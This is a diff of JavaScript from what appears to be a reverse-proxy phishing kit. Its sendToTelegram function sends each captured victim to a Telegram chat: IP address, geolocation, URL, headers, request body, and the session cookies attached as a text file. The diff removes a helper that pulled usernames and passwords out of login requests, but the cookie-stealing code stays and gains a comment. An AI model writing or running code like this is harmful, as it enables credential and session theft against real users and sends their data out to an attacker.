@@ -95,21 +95,7 @@ async function sendToTelegram(data) {
             location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
         }
 
-        // 𝙴𝚡𝚝𝚛𝚊𝚌𝚝 𝚌𝚛𝚎𝚍𝚜
-        function extractCredentials(body) {
-            if (!body) return null;
-            try {
-                const parsed = typeof body === 'string' ? JSON.parse(body) : body;
-                const username = parsed?.username || parsed?.login || parsed?.email || null;
-                const password = parsed?.passwd || parsed?.password || null;
-                if (username || password) return { username, password };
-            } catch (e) {}
-            return null;
-        }
-
-        const creds = extractCredentials(data.proxyRequestBody);
-
-        let message = `
+        const message = `
 🔐 **New Capture!**
 
 🌍 **IP:** ${ip}
@@ -119,13 +105,7 @@ ${flag} **Location:** ${location}
 
 🕒 **Time:** ${data.timestamp || new Date().toISOString()}
 🔗 **URL:** ${data.proxyRequestURL || 'N/A'}
-📨 **Method:** ${data.proxyRequestMethod || 'N/A'}`;
-
-        if (creds) {
-            message += `\n🔑 **Username:** ${creds.username || 'N/A'}\n🔐 **Password:** ${creds.password || 'N/A'}`;
-        }
-
-        message += `
+📨 **Method:** ${data.proxyRequestMethod || 'N/A'}
 
 📋 **Headers:**
 \`\`\`json
@@ -146,6 +126,7 @@ ${JSON.stringify(data.proxyRequestBody || {}, null, 2)}
             parse_mode: 'Markdown'
         });
 
+        // 𝙰𝚝𝚝𝚊𝚌𝚑 𝚌𝚘𝚘𝚔𝚒𝚎𝚜 𝚊𝚜 .𝚝𝚡𝚝 𝚏𝚒𝚕𝚎
         const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
         if (cookies) {
             await sendCookiesAsFile(cookies, data.sessionId || 'unknown');
@@ -155,6 +136,7 @@ ${JSON.stringify(data.proxyRequestBody || {}, null, 2)}
         console.log('Telegram send failed', e.message);
     }
 }
+
 // ================================================
 // 𝚁𝙴𝚂𝚃 𝙾𝙵 𝚈𝙾𝚄𝚁 𝙲𝙾𝙳𝙴 (𝚑𝚝𝚝𝚙, 𝚑𝚝𝚝𝚙𝚜, 𝚙𝚊𝚝𝚑, 𝚏𝚜, 𝚎𝚝𝚌.)
 // ================================================
